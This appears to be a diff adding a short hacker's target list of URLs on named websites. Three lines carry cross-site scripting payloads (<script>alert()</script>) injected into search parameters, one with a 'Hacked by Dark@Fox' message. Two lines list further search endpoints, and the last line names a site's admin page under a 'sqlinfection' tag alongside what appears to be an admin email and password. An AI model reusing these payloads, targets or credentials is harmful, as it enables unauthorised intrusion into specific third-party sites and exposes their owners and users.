@@ -1,0 +1,7 @@
+1.https://sdgraphics.com/system/search_results.php?req|global=<script>alert(1);</script>
+2.http://www.jst.co.uk/search.php?searchString=<script>alert(1);</script>
+3.http://onics.ru/search.php?q=<script>alert('Hacked by Dark@Fox');</script>
+4.http://www.jerusalemeverything.com/search.php?searchstring=
+http://www.vectorpicker.com/search.php?search=
+https://propeller.in/frameworks/open-source/get-started/
+http://www.7thsin.in/admin/ #sqlinfection : admin@7thsin.in==$!nf0RJe@nS
